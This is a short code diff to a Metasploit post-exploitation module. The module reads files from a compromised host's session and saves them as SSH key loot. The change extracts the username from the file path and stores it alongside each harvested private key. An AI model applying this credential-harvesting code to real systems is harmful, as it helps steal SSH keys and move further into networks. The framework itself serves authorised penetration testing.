@@ -59,7 +59,9 @@ class Metasploit3 < Msf::Post
 				sep = "/"
 				files = cmd_exec("ls -1 #{path}").split(/\r\n|\r|\n/)
 			end
-
+      path_array = path.split(sep)
+      path_array.pop
+      user = path_array.pop
 			files.each do |file|
 				next if [".", ".."].include?(file)
 				data = read_file("#{path}#{sep}#{file}")
@@ -77,6 +79,7 @@ class Metasploit3 < Msf::Post
 						:host => session.session_host,
 						:port => 22,
 						:sname => 'ssh',
+            :user => user,
 						:pass => loot_path,
 						:source_type => "exploit",
 						:type => 'ssh_key',
